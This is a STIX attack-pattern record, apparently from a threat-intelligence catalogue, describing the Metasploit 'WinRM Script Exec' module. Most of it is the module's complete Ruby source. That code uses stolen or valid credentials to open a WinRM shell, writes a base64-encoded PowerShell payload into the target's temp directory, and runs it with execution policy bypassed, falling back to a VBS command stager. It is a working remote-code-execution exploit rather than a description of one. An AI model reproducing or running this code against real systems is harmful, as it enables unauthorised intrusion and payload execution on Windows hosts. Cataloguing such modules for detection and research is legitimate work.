{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f98c228a-8ec4-49ea-baf6-74c2aea32a15",
    "created": "2024-08-14T16:47:50.449407Z",
    "modified": "2024-08-14T16:47:50.449411Z",
    "name": "WinRM Script Exec Remote Code Execution",
    "description": " This module uses valid credentials to login to the WinRM service and execute a payload. It has two available methods for payload delivery: Powershell 2 (and above) and VBS CmdStager.  The module will check if Powershell is available, and if so uses that method. Otherwise it falls back to the VBS CmdStager which is less stealthy. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/winrm/winrm_script_exec.rb",
            "external_id": "winrm_script_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'net/winrm/connection'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::WinRM\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WinRM Script Exec Remote Code Execution',\n        'Description' => %q{\n          This module uses valid credentials to login to the WinRM service\n          and execute a payload. It has two available methods for payload\n          delivery: Powershell 2 (and above) and VBS CmdStager.\n\n          The module will check if Powershell is available, and if so uses\n          that method. Otherwise it falls back to the VBS CmdStager which is\n          less stealthy.\n        },\n        'Author' => [ 'thelightcosine' ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'http://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx' ],\n        ],\n        'Privileged' => true,\n        'DefaultOptions' => {\n          'WfsDelay' => 30,\n          'EXITFUNC' => 'thread',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n          'CMDSTAGER::DECODER' => File.join(Rex::Exploitation::DATA_DIR, 'exploits', 'cmdstager', 'vbs_b64_sleep')\n        },\n        'Platform' => 'win',\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'Targets' => [\n          [ 'Windows', {} ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2012-11-01',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('FORCE_VBS', [ true, 'Force the module to use the VBS CmdStager', false]),\n      ], self.class\n    )\n    deregister_options('CMDSTAGER::FLAVOR')\n    @compat_mode = false\n  end\n\n  def exploit\n    check_winrm_parameters\n    self.conn = create_winrm_connection\n    self.shell = conn.shell(:cmd, {})\n    if powershell2?\n      path = upload_script\n      return if path.nil?\n\n      exec_script(path)\n    else\n      execute_cmdstager({ flavor: :vbs })\n    end\n    handler\n  end\n\n  # Run the WinRM command\n  def winrm_run_cmd(command)\n    shell.run(command)\n  end\n\n  # Run the WinRM command on a background thread\n  def winrm_run_cmd_async(command)\n    framework.threads.spawn(\"winrm_script_exec keepalive worker\", false) do\n      begin\n        winrm_run_cmd(command)\n      ensure\n        self.shell.close\n      end\n    end\n  end\n\n  # Execute a command on the WinRM shell (called via the VBS Stager)\n  def execute_command(cmd, _opts)\n    commands = cmd.split(/&/)\n    commands.each do |command|\n      if command.include? 'cscript'\n        winrm_run_cmd_async(command)\n      elsif command.include? 'del %TEMP%'\n        next\n      else\n        winrm_run_cmd(command)\n      end\n    end\n  end\n\n  # Uploads a powershell script to the server\n  # @return [String] Path to the uploaded script\n  def upload_script\n    tdir = temp_dir\n    return if tdir.nil?\n\n    path = tdir + '\\\\' + ::Rex::Text.rand_text_alpha(8) + '.ps1'\n    print_status(\"Uploading powershell script to #{path} (This may take a few minutes)...\")\n\n    script = Msf::Util::EXE.to_win32pe_psh(framework, payload.encoded)\n    # add a sleep to the script to give us enough time to migrate\n    script << \"\\n Start-Sleep -s 20\"\n    script.each_line do |psline|\n      # build our psh command to write out our psh script, meta eh?\n      script_line = \"Add-Content #{path} '#{psline.chomp}' \"\n      cmd = encoded_psh(script_line)\n      winrm_run_cmd(cmd)\n    end\n    return path\n  end\n\n  # Executes the PowerShell script at the given path\n  # @param [String] path Path to the uploaded script\n  def exec_script(path)\n    print_status('Attempting to execute script...')\n    cmd = \"#{@invoke_powershell} -ExecutionPolicy bypass -File #{path}\"\n    winrm_run_cmd_async(cmd)\n  end\n\n  # Create a command line to execute the provided script inline\n  # @return [String] Command line argument to execute the provided command in the -EncodedCommand parameter\n  def encoded_psh(script)\n    script = Rex::Text.encode_base64(script.encode('utf-16le')).chomp\n\n    return \"#{@invoke_powershell} -encodedCommand #{script}\"\n  end\n\n  # Gets the temporary directory of the remote shell\n  # @return [String] The temporary directory of the remote shell\n  def temp_dir\n    print_status('Grabbing %TEMP%')\n    cmd = 'echo %TEMP%'\n    output = winrm_run_cmd(cmd)\n    return output.stdout.chomp\n  end\n\n  # The architecture of the remote system\n  def get_remote_arch\n    wql = %q{select AddressWidth from Win32_Processor where DeviceID=\"CPU0\"}\n    resp = conn.run_wql(wql)\n    addr_width = resp[:xml_fragment][0][:address_width]\n    if addr_width == '64'\n      return ARCH_X64\n    else\n      return ARCH_X86\n    end\n  end\n\n  # Verifies that the remote architecture is compatible with our payload\n  # @return [Boolean] Does the payload match the architecture?\n  # @note Sets @compat_mode to true if running x86 payload on x64 arch\n  def correct_payload_arch?\n    @target_arch = get_remote_arch\n    case @target_arch\n    when ARCH_X64\n      unless datastore['PAYLOAD'].include?(ARCH_X64)\n        print_error('You selected an x86 payload for an x64 target...trying to run in compat mode')\n        @compat_mode = true\n        return false\n      end\n    when ARCH_X86\n      if datastore['PAYLOAD'].include?(ARCH_X64)\n        print_error('You selected an x64 payload for an x86 target')\n        return false\n      end\n    end\n    return true\n  end\n\n  # Is PowerShell version 2 (or above) available\n  # @return [Boolean]\n  # @note Sets @invoke_powershell based on whether @compat_mode is set - to potentially force the use of x86 PowerShell while on an x64 system\n  def powershell2?\n    if datastore['FORCE_VBS']\n      print_status('User selected the FORCE_VBS option')\n      return false\n    end\n    print_status('Checking for Powershell 2.0')\n    output = winrm_run_cmd('powershell Get-Host')\n    if output.stderr.include? 'not recognized'\n      print_error('Powershell is not installed')\n      return false\n    end\n    output.stdout.each_line do |line|\n      next unless line.start_with? 'Version'\n\n      major_version = line.match(/\\d(?=\\.)/)[0]\n      if major_version == '1'\n        print_error('The target is running an older version of Powershell')\n        return false\n      end\n    end\n\n    return false unless correct_payload_arch? || (@target_arch == ARCH_X64)\n\n    if @compat_mode == true\n      @invoke_powershell = '%SYSTEMROOT%\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'\n    else\n      @invoke_powershell = 'powershell'\n    end\n\n    return true\n  end\n\n  # @return [WinRM::Shells::Cmd] The WinRM Shell object\n  attr_accessor :shell\n\n  # @return [Net::MsfWinRM::RexWinRMConnection] The WinRM connection\n  attr_accessor :conn\nend\n",
    "x_mitre_disclosure_date": "2012-11-01",
    "x_mitre_platforms": [
        "win'"
    ]
}